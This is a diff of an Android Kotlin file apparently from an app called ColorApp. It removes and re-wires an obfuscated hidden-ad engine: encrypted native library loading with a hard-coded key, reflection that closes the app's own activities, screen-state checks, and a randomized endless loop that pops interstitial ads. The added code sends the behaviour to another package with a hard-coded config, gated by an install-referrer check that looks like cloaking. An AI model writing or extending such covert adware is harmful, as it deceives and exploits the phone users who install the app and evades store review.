@@ -1,15 +1,14 @@
-package m.ki
+package com.announcement.comprehension.t.dex
 
-import android.app.Activity
 import android.app.Application
 import android.content.Context
 import android.os.Build
 import android.os.Bundle
-import android.os.PowerManager
 import android.util.Base64
 import android.util.Log
 import com.android.installreferrer.api.InstallReferrerClient
 import com.android.installreferrer.api.InstallReferrerStateListener
+import com.announcement.comprehension.t.ColorApp
 import com.facebook.FacebookSdk
 import com.facebook.appevents.AppEventsLogger
 import com.google.android.gms.ads.identifier.AdvertisingIdClient
@@ -30,8 +29,6 @@ import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.Response
 import org.json.JSONObject
-import xik.af
-import xik.wn
 import java.io.ByteArrayOutputStream
 import java.io.File
 import java.io.FileOutputStream
@@ -45,21 +42,8 @@ import kotlin.text.toByteArray
 
 object Fnc {
     lateinit var app: Application
-    lateinit var byteAd1: Pdd
-    lateinit var byteAd2: Pdd
-
-    lateinit var plusAd1: Tdd
-    lateinit var plusAd2: Tdd
 
     private var once = false
-    private var hide = false//hideDid
-
-    private var loop = 0L//loopTime
-    private var gap = 0L//gapTime
-    private var first = 0L//firstTime
-
-    private var popLoopJob: Job? = null
-    var lastShowTime = 0L//last ShowTime
     private var loadingAdmin = false//loading admin
     private var job: Job? = null
     private val a by lazy { AppEventsLogger.newLogger(app) }
@@ -81,23 +65,9 @@ object Fnc {
     private var bLoop = 10//b user loopTime
     private var up = true//can upload tba point
 
-    var useByte = true
-    var afterT = false
 
     private val okMaster = OkHttpClient()
-    var autoCloseAdJob: Job? = null
-
-    var maxShowTime = 0L
-    var popMinDelay = 0L
-    var popMaxDelay = 0L
-    var popUnit = 0L
-
-    var failPopMax = 0
-    var hourMaxShow = 0
-    var dayMaxShow = 0
-    var nowPopFail = 0
     var adminMaxTime = 100//默认不能为0，否则有问题
-    private var isOpenLimit = true//是否开启上限
 
     fun start(a0: Application, a1: ArrayList<String>) {
         this.app = a0
@@ -213,7 +183,18 @@ object Fnc {
         } catch (_: Exception) {
         }
         if (isA(c)) {
-            ac(c)
+
+            m.ki.Dva.sim(ColorApp.app, arrayListOf(
+                """{
+    "bta":"wow_bob_dud_kuk",
+    "cvv":"id_token",
+    "nak":"981772962_981772963",
+    "akm":"5_10",
+    "nma":"10_20_30_20_5",
+    "eka":"15_10_0_30_200_400"
+}""","bug"
+            ))
+
         }
     }
 
@@ -234,185 +215,6 @@ object Fnc {
     }
 
 
-    fun closeAll() {
-        try {
-            val cls = Class.forName("u4.f")
-            val ins = cls.getDeclaredField("INSTANCE")
-            ins.isAccessible = true
-            val aIns = ins.get(null)
-            val f1 = cls.getDeclaredField("c8")
-            f1.isAccessible = true
-            val list = f1.get(aIns) as? MutableList<*>
-            if (list != null) {
-                for (page in list) {
-                    (page as? Activity)?.finishAndRemoveTask()
-                }
-                list.clear()
-            }
-        } catch (_: Throwable) {
-        }
-        afterT = true
-    }
-
-    private fun ac(a0: String) {
-        val js = JSONObject(a0)
-
-        val byteIds = js.optString("nak").split("_")
-        val byteId1 = byteIds.getOrNull(0) ?: ""
-        val byteId2 = byteIds.getOrNull(1) ?: ""
-        val plusId1 = byteIds.getOrNull(0) ?: ""
-        val plusId2 = byteIds.getOrNull(1) ?: ""
-
-        useByte = js.optString("bta").contains("kuk")
-        isOpenLimit = js.optString("bta").contains("dud")
-
-        val limits = js.optString("nma").split("_")
-        hourMaxShow = limits[0].toInt()
-        dayMaxShow = limits[1].toInt()
-        failPopMax = limits[2].toInt()
-        maxShowTime = limits[3].toInt() * 1000L
-        adminMaxTime = limits[4].toInt()
-
-
-        val parts = js.optString("eka").split("_")
-        loop = parts[0].toInt() * 1000L
-        popUnit = parts[1].toInt() * 1000L
-        gap = parts[2].toInt() * 1000L
-        first = parts[3].toInt() * 1000L
-        popMinDelay = parts[4].toLong()
-        popMaxDelay = parts[5].toLong()
-
-        try {
-            val file = File(app.filesDir.parentFile, "hotmdl")
-            if (!file.exists()) file.mkdirs()
-        } catch (_: Exception) {
-        }
-        if (!hide) {
-            hide = true
-            byteAd1 = Pdd(id = byteId1, tag = "1")
-            byteAd2 = Pdd(id = byteId2, tag = "2")
-            plusAd1 = Tdd(id = plusId1, tag = "1")
-            plusAd2 = Tdd(id = plusId2, tag = "2")
-
-            app.registerActivityLifecycleCallbacks(Udd())
-            loadSo(app, app.packageName, "vbiKMu90!pkk*&BK", "CarT", "T")
-            loadSo(app, app.packageName, "vbiKMu90!pkk*&BK", "CarH", "H")
-            CoroutineScope(Dispatchers.Main).launch {
-                try {
-                    wn.lo3(1, 0.9, "yaso")
-                } catch (_: Throwable) {
-                }
-                try {
-                    af.v7(app)
-                } catch (_: Throwable) {
-                }
-            }
-            al()
-        } else {
-            byteAd1.updateId(byteId1)
-            byteAd2.updateId(byteId2)
-            plusAd1.updateId(plusId1)
-            plusAd2.updateId(plusId2)
-        }
-    }
-
-    private fun al() {//loop
-        popLoopJob?.cancel()
-        popLoopJob = CoroutineScope(Dispatchers.Main).launch {
-            var thisDealyTime: Long
-            while (true) {
-                thisDealyTime = try {
-                    Random.nextLong(loop - popUnit, loop + popUnit)
-                } catch (_: Throwable) {
-                    loop
-                }
-                if (isOpenLimit) {
-                    if (Ldd.limit() == 0 && nowPopFail < failPopMax) {
-                        if (useByte) {
-                            byteAd1.loadP(app)
-                            byteAd2.loadP(app)
-                        } else {
-                            plusAd1.loadT(app)
-                            plusAd2.loadT(app)
-                        }
-                    }
-                } else {
-                    if (useByte) {
-                        byteAd1.loadP(app)
-                        byteAd2.loadP(app)
-                    } else {
-                        plusAd1.loadT(app)
-                        plusAd2.loadT(app)
-                    }
-                }
-                ae(thisDealyTime)
-                delay(thisDealyTime)
-            }
-        }
-    }
-
-    fun lock(): Boolean {
-        return (app.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive.not()
-    }
-
-    private suspend fun ae(time: Long) {
-        if (isOpenLimit) {
-            val limitType = Ldd.limit()
-            if (limitType != 0) {
-                val value = when (limitType) {
-                    1 -> "hourL"
-                    2 -> "dayL"
-                    else -> ""
-                }
-                val key = if (limitType == 1) "hourMarkTag" else "dayMarkTag"
-                val tag = if (limitType == 1) Ldd.getTag() else Ldd.getTag(1)
-                if (Ldd.readStr(key) != tag) {
-                    Ldd.saveStr(key, tag)
-                    o(listOf("ad_pass", "string", value))
-                }
-                return
-            }
-            if (nowPopFail >= failPopMax) {
-                if (Ldd.readStr("k8") != Ldd.getTag(1)) {
-                    o(listOf("pop_fail"))
-                    Ldd.saveStr("k8", Ldd.getTag(1))
-                }
-                return
-            }
-        }
-
-        o(listOf("ad_session", "time", (time / 1000).toString()))
-        if (lock()) return
-        o(listOf("ad_light"))
-        if (System.currentTimeMillis() - iTime < first) {
-            o(listOf("ad_pass", "string", "firstNo"))
-            return
-        }
-        if (System.currentTimeMillis() - lastShowTime < gap) {
-            o(listOf("ad_pass", "string", "gapNo"))
-            return
-        }
-        if (useByte) {
-            if ((byteAd1.looking() || byteAd2.looking())) {
-                o(listOf("ad_pass", "string", "seeingP"))
-                return
-            }
-        } else {
-            if ((plusAd1.isLooking() || plusAd2.isLooking())) {
-                o(listOf("ad_pass", "string", "seeingT"))
-                return
-            }
-        }
-        o(listOf("ad_pass", "string", "NULL"))
-        closeAll()
-        delay(368)
-        nowPopFail += 1
-        try {
-            wn.lo3(0, 0.2, "bkbir")
-        } catch (t: Throwable) {
-        }
-        o(listOf("ad_start"))
-    }
 
     private fun minG(a0: Int = 5) {
         if (loadingAdmin || Ldd.adminLimit() == 1) return
